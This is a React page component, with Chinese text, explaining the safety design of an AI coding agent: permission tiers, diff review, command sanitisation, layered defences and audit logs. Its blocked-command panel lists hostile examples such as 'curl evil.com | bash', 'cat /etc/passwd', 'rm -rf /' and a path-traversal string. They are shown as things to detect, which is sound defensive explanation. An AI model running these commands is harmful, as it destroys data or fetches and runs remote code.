import React from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Shield, Lock, Eye, AlertTriangle, CheckCircle, XCircle, FileText, Terminal, AlertOctagon } from 'lucide-react';

const SecurityRisk = () => {
  const navigate = useNavigate();

  return (
    <div className="w-full min-h-screen bg-gradient-to-br from-red-50 to-rose-50 p-8 overflow-auto">
      <div className="max-w-7xl mx-auto">
        <button
          onClick={() => navigate('/')}
          className="flex items-center gap-2 text-red-600 hover:text-red-800 mb-6 transition-colors"
        >
          <ArrowLeft size={20} />
          <span className="font-medium">返回架构总览</span>
        </button>

        <div className="flex items-center gap-3 mb-2">
          <Shield className="text-red-600" size={32} />
          <h1 className="text-3xl font-bold text-slate-800">安全与风险管理</h1>
        </div>
        <p className="text-sm text-slate-600 mb-8">Security & Risk Management - 多层防护确保安全操作</p>

        {/* 权限系统 */}
        <div className="bg-white border-2 border-red-200 rounded-lg p-6 mb-6 shadow-sm">
          <h2 className="text-xl font-bold text-red-800 mb-4">🔐 权限系统</h2>

          <div className="grid grid-cols-3 gap-6">
            <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
              <div className="flex items-center gap-2 mb-3">
                <CheckCircle className="text-green-600" size={20} />
                <h3 className="font-bold text-green-800">自动允许</h3>
              </div>
              <p className="text-sm text-slate-600 mb-3">无需确认，直接执行</p>
              <div className="space-y-1 text-xs font-mono bg-white p-2 rounded">
                <p>• Read (读取文件)</p>
                <p>• Glob (文件搜索)</p>
                <p>• Grep (内容搜索)</p>
                <p>• git status</p>
                <p>• git log</p>
                <p>• ls, pwd, cat</p>
              </div>
            </div>

            <div className="bg-yellow-50 border-2 border-yellow-200 rounded-lg p-4">
              <div className="flex items-center gap-2 mb-3">
                <AlertTriangle className="text-yellow-600" size={20} />
                <h3 className="font-bold text-yellow-800">需要确认</h3>
              </div>
              <p className="text-sm text-slate-600 mb-3">首次执行需用户同意</p>
              <div className="space-y-1 text-xs font-mono bg-white p-2 rounded">
                <p>• Edit (编辑文件)</p>
                <p>• Write (写入文件)</p>
                <p>• npm install</p>
                <p>• git commit</p>
                <p>• mkdir, touch</p>
              </div>
            </div>

            <div className="bg-red-50 border-2 border-red-200 rounded-lg p-4">
              <div className="flex items-center gap-2 mb-3">
                <XCircle className="text-red-600" size={20} />
                <h3 className="font-bold text-red-800">每次确认</h3>
              </div>
              <p className="text-sm text-slate-600 mb-3">高风险操作必须确认</p>
              <div className="space-y-1 text-xs font-mono bg-white p-2 rounded">
                <p>• rm -rf</p>
                <p>• git push --force</p>
                <p>• sudo 命令</p>
                <p>• curl / wget</p>
                <p>• 网络请求</p>
              </div>
            </div>
          </div>
        </div>

        {/* Diff 优先 */}
        <div className="bg-white border-2 border-blue-200 rounded-lg p-6 mb-6 shadow-sm">
          <h2 className="text-xl font-bold text-blue-800 mb-4">📊 Diff 优先策略</h2>

          <div className="grid grid-cols-2 gap-6">
            <div>
              <p className="text-slate-700 mb-4">
                所有文件修改都以<span className="font-bold text-blue-600">差异(Diff)形式</span>展示，
                让用户在执行前清楚看到将要发生的变化。
              </p>

              <div className="bg-blue-50 p-4 rounded-lg">
                <h3 className="font-semibold text-blue-700 mb-2">优势</h3>
                <div className="space-y-2 text-sm">
                  <div className="flex items-center gap-2">
                    <Eye className="text-blue-600" size={16} />
                    <span>修改内容一目了然</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="text-blue-600" size={16} />
                    <span>易于审查和确认</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <AlertTriangle className="text-blue-600" size={16} />
                    <span>发现问题可以拒绝</span>
                  </div>
                </div>
              </div>
            </div>

            <div>
              <h3 className="font-semibold text-blue-700 mb-3">Diff 示例</h3>
              <div className="bg-slate-800 rounded-lg p-4 font-mono text-sm">
                <p className="text-slate-400">// src/utils.js</p>
                <p className="text-red-400">- function formatDate(date) {'{'}</p>
                <p className="text-red-400">-   return date.toString();</p>
                <p className="text-red-400">- {'}'}</p>
                <p className="text-green-400">+ function formatDate(date, timezone) {'{'}</p>
                <p className="text-green-400">+   const options = {'{'} timeZone: timezone {'}'};</p>
                <p className="text-green-400">+   return date.toLocaleString('zh-CN', options);</p>
                <p className="text-green-400">+ {'}'}</p>
              </div>
              <div className="mt-2 flex gap-2">
                <button className="px-3 py-1 bg-green-100 text-green-700 rounded text-xs">✓ 接受</button>
                <button className="px-3 py-1 bg-red-100 text-red-700 rounded text-xs">✗ 拒绝</button>
              </div>
            </div>
          </div>
        </div>

        {/* 命令消毒 */}
        <div className="bg-white border-2 border-purple-200 rounded-lg p-6 mb-6 shadow-sm">
          <h2 className="text-xl font-bold text-purple-800 mb-4">🛡️ 命令消毒</h2>

          <div className="grid grid-cols-2 gap-6">
            <div>
              <h3 className="font-semibold text-purple-700 mb-3">防护措施</h3>
              <div className="space-y-3">
                <div className="bg-purple-50 p-3 rounded-lg">
                  <div className="flex items-center gap-2 mb-1">
                    <AlertOctagon className="text-purple-600" size={16} />
                    <span className="font-semibold text-purple-700 text-sm">反引号阻止</span>
                  </div>
                  <p className="text-xs text-slate-600">防止命令注入 `rm -rf /`</p>
                </div>
                <div className="bg-purple-50 p-3 rounded-lg">
                  <div className="flex items-center gap-2 mb-1">
                    <AlertOctagon className="text-purple-600" size={16} />
                    <span className="font-semibold text-purple-700 text-sm">Shell 扩展过滤</span>
                  </div>
                  <p className="text-xs text-slate-600">过滤 $() 和 ${'{}'} 等危险扩展</p>
                </div>
                <div className="bg-purple-50 p-3 rounded-lg">
                  <div className="flex items-center gap-2 mb-1">
                    <AlertOctagon className="text-purple-600" size={16} />
                    <span className="font-semibold text-purple-700 text-sm">路径验证</span>
                  </div>
                  <p className="text-xs text-slate-600">防止路径遍历 ../../../etc/passwd</p>
                </div>
              </div>
            </div>

            <div>
              <h3 className="font-semibold text-purple-700 mb-3">危险模式检测</h3>
              <div className="bg-slate-800 rounded-lg p-4 font-mono text-sm">
                <p className="text-gray-400">// 被阻止的危险命令</p>
                <p className="text-red-400">❌ rm -rf /</p>
                <p className="text-red-400">❌ echo `whoami`</p>
                <p className="text-red-400">❌ cat /etc/passwd</p>
                <p className="text-red-400">❌ curl evil.com | bash</p>
                <p className="text-red-400">❌ chmod 777 /</p>
                <p></p>
                <p className="text-gray-400">// 允许的安全命令</p>
                <p className="text-green-400">✓ npm install lodash</p>
                <p className="text-green-400">✓ git commit -m "fix"</p>
                <p className="text-green-400">✓ rm -rf node_modules</p>
              </div>
            </div>
          </div>
        </div>

        {/* 多层防护架构 */}
        <div className="bg-white border-2 border-slate-200 rounded-lg p-6 mb-6 shadow-sm">
          <h2 className="text-xl font-bold text-slate-800 mb-4">🏰 多层防护架构</h2>

          <div className="flex items-center justify-between">
            <div className="flex-1 text-center">
              <div className="bg-red-100 border-2 border-red-300 rounded-lg p-4 mx-2">
                <Lock className="mx-auto text-red-600 mb-2" size={28} />
                <p className="font-semibold text-red-800 text-sm">第一层</p>
                <p className="text-xs text-slate-600">LLM 内置安全</p>
                <p className="text-xs text-red-600 mt-1">拒绝生成恶意代码</p>
              </div>
            </div>

            <div className="text-slate-300 text-2xl">→</div>

            <div className="flex-1 text-center">
              <div className="bg-orange-100 border-2 border-orange-300 rounded-lg p-4 mx-2">
                <Shield className="mx-auto text-orange-600 mb-2" size={28} />
                <p className="font-semibold text-orange-800 text-sm">第二层</p>
                <p className="text-xs text-slate-600">命令消毒</p>
                <p className="text-xs text-orange-600 mt-1">过滤危险模式</p>
              </div>
            </div>

            <div className="text-slate-300 text-2xl">→</div>

            <div className="flex-1 text-center">
              <div className="bg-yellow-100 border-2 border-yellow-300 rounded-lg p-4 mx-2">
                <Eye className="mx-auto text-yellow-600 mb-2" size={28} />
                <p className="font-semibold text-yellow-800 text-sm">第三层</p>
                <p className="text-xs text-slate-600">权限检查</p>
                <p className="text-xs text-yellow-600 mt-1">用户确认机制</p>
              </div>
            </div>

            <div className="text-slate-300 text-2xl">→</div>

            <div className="flex-1 text-center">
              <div className="bg-green-100 border-2 border-green-300 rounded-lg p-4 mx-2">
                <FileText className="mx-auto text-green-600 mb-2" size={28} />
                <p className="font-semibold text-green-800 text-sm">第四层</p>
                <p className="text-xs text-slate-600">Diff 审查</p>
                <p className="text-xs text-green-600 mt-1">可视化变更</p>
              </div>
            </div>

            <div className="text-slate-300 text-2xl">→</div>

            <div className="flex-1 text-center">
              <div className="bg-blue-100 border-2 border-blue-300 rounded-lg p-4 mx-2">
                <Terminal className="mx-auto text-blue-600 mb-2" size={28} />
                <p className="font-semibold text-blue-800 text-sm">第五层</p>
                <p className="text-xs text-slate-600">沙箱执行</p>
                <p className="text-xs text-blue-600 mt-1">隔离环境</p>
              </div>
            </div>
          </div>
        </div>

        {/* 配置选项 */}
        <div className="grid grid-cols-2 gap-6 mb-6">
          <div className="bg-white border-2 border-teal-200 rounded-lg p-5 shadow-sm">
            <h3 className="font-bold text-teal-800 mb-3">⚙️ 权限配置</h3>
            <div className="bg-slate-800 rounded-lg p-3 font-mono text-xs">
              <p className="text-gray-400">// settings.json</p>
              <p className="text-white">{'{'}</p>
              <p className="text-white pl-2">"permissions": {'{'}</p>
              <p className="text-green-400 pl-4">"allow": ["Read", "Glob", "Grep"],</p>
              <p className="text-yellow-400 pl-4">"ask": ["Edit", "Write", "Bash"],</p>
              <p className="text-red-400 pl-4">"deny": ["rm -rf /"]</p>
              <p className="text-white pl-2">{'}'},</p>
              <p className="text-white pl-2">"allowedDirectories": [</p>
              <p className="text-white pl-4">"/home/user/project"</p>
              <p className="text-white pl-2">]</p>
              <p className="text-white">{'}'}</p>
            </div>
          </div>

          <div className="bg-white border-2 border-indigo-200 rounded-lg p-5 shadow-sm">
            <h3 className="font-bold text-indigo-800 mb-3">📝 审计日志</h3>
            <div className="space-y-2 text-sm">
              <div className="bg-indigo-50 p-2 rounded">
                <span className="text-indigo-600">10:23:45</span>
                <span className="ml-2">Read: src/app.tsx</span>
                <span className="text-green-600 ml-2">✓</span>
              </div>
              <div className="bg-indigo-50 p-2 rounded">
                <span className="text-indigo-600">10:23:52</span>
                <span className="ml-2">Edit: src/app.tsx</span>
                <span className="text-yellow-600 ml-2">⚠ 已确认</span>
              </div>
              <div className="bg-indigo-50 p-2 rounded">
                <span className="text-indigo-600">10:24:01</span>
                <span className="ml-2">Bash: rm -rf /tmp/*</span>
                <span className="text-red-600 ml-2">✗ 已拒绝</span>
              </div>
            </div>
            <p className="text-xs text-slate-500 mt-2">所有操作都有记录，便于追溯</p>
          </div>
        </div>

        {/* 设计原则 */}
        <div className="bg-gradient-to-r from-red-600 to-rose-600 text-white rounded-lg p-5">
          <h3 className="font-bold text-lg mb-3">🎯 安全设计原则</h3>
          <div className="grid grid-cols-4 gap-4 text-sm">
            <div>
              <p className="font-semibold text-red-200">最小权限</p>
              <p className="text-xs text-red-100">只授予必要的权限</p>
            </div>
            <div>
              <p className="font-semibold text-red-200">纵深防御</p>
              <p className="text-xs text-red-100">多层防护，层层把关</p>
            </div>
            <div>
              <p className="font-semibold text-red-200">显式确认</p>
              <p className="text-xs text-red-100">危险操作必须确认</p>
            </div>
            <div>
              <p className="font-semibold text-red-200">完整审计</p>
              <p className="text-xs text-red-100">所有操作可追溯</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SecurityRisk;
